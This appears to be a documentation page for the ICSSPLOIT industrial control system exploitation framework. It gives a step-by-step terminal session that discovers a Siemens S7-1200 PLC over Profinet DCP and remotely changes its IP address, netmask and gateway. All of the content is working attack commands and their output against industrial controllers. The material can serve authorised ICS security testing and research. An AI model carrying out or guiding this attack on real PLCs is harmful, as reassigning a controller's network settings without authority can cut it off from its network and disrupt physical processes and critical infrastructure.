# Profinet set ip

# Use Profinet set ip module
    root@kali:~/Desktop/temp/isf# python isf.py
    
      _____ _____  _____ _____ _____  _      ____ _____ _______
     |_   _/ ____|/ ____/ ____|  __ \| |    / __ \_   _|__   __|
       | || |    | (___| (___ | |__) | |   | |  | || |    | |
       | || |     \___ \\___ \|  ___/| |   | |  | || |    | |
      _| || |____ ____) |___) | |    | |___| |__| || |_   | |
     |_____\_____|_____/_____/|_|    |______\____/_____|  |_|
    
    
                    ICS Exploitation Framework
    
    Note     : ICSSPOLIT is fork from routersploit at
               https://github.com/reverse-shell/routersploit
    Dev Team : wenzhe zhu(dark-lbp)
    Version  : 0.1.0
    
    Exploits: 5 Scanners: 3 Creds: 13
    
    ICS Exploits:
        PLC: 5          ICS Switch: 0
        Software: 0
    
    isf >
    isf > search profinet
    exploits/plcs/siemens/profinet_set_ip
    scanners/profinet_dcp_scan
    isf > exploits/plcs/siemens/profinet_set_ip
    isf (profinet device ip setup) >

    
# Set options
    isf (profinet device ip setup) > show options
    Target options:
    
       Name       Current settings      Description
       ----       ----------------      -----------
       target     40:6c:8f:ff:ff:ff     Target mac address, e.g. 40:6c:8f:ff:ff:ff
    
    
    Module options:
    
       Name               Current settings     Description
       ----               ----------------     -----------
       timeout            3                    Timeout for response
       target_ip          192.168.1.100        IP Address to set
       nic                eth0                 Interface Name e.g eth0, en0
       target_gateway     0.0.0.0              Gateway to set
       target_netmask     255.255.255.0        Network mask to set
       verbose            0                    Scapy verbose level, 0 to 2
    
    # Because profient dcp is a ethernet protocol, we need setup which interface to send and recive profinet dpc packet.
    # Use set nic eth0 to define which interface we want to send and recive profinet dpc packet.
    isf (profinet device ip setup) > set nic eth0
    [+] {'nic': 'eth0'}
    
    # Setup target mac address
    isf (profinet device ip setup) > set target 00:1c:06:1d:ff:ff
    [+] {'target': '00:1c:06:1d:ff:ff'}
    
    # If you didn't know target mac address this time, you can use scan command to discover profinet devices.
    isf (profinet device ip setup) > scan
    Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
    -------------  -------------  -----------------  --------------  -------------  ---------
    plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.100  255.255.255.0  0.0.0.0
    
    # Setup ip address, netmask and gateway.
    isf (profinet device ip setup) > set target_ip 192.168.1.110
    [+] {'target_ip': '192.168.1.110'}
    isf (profinet device ip setup) > set target_netmask 255.255.255.0
    [+] {'target_netmask': '255.255.255.0'}
    # Set gateway to 0.0.0.0 mean target didn't have a gateway.
    isf (profinet device ip setup) > set target_gateway 0.0.0.0
    [+] {'target_gateway': '0.0.0.0'}

# Run module
    isf (profinet device ip setup) > run
    # run command will send a profinet dcp packet to check target current ip setting. 
    Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
    -------------  -------------  -----------------  --------------  -------------  ---------
    plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.100  255.255.255.0  0.0.0.0
    
    
    [*] Please make sure target device info is correct.
    [*] Do you want setup target with
     ip address: 192.168.1.110
     network mask: 255.255.255.0
     gateway:0.0.0.0
    
    Y/y to confirm, other to cancel.
    :y
    Device Name    Device Type    MAC Address        IP Address      Netmask        GateWay
    -------------  -------------  -----------------  --------------  -------------  ---------
    plcxb1d0ed     S7-1200        00:1c:06:1d:ff:ff  192.168.1.110  255.255.255.0  0.0.0.0
    
    
    [+] Setup target ip succeed
    isf (profinet device ip setup) >
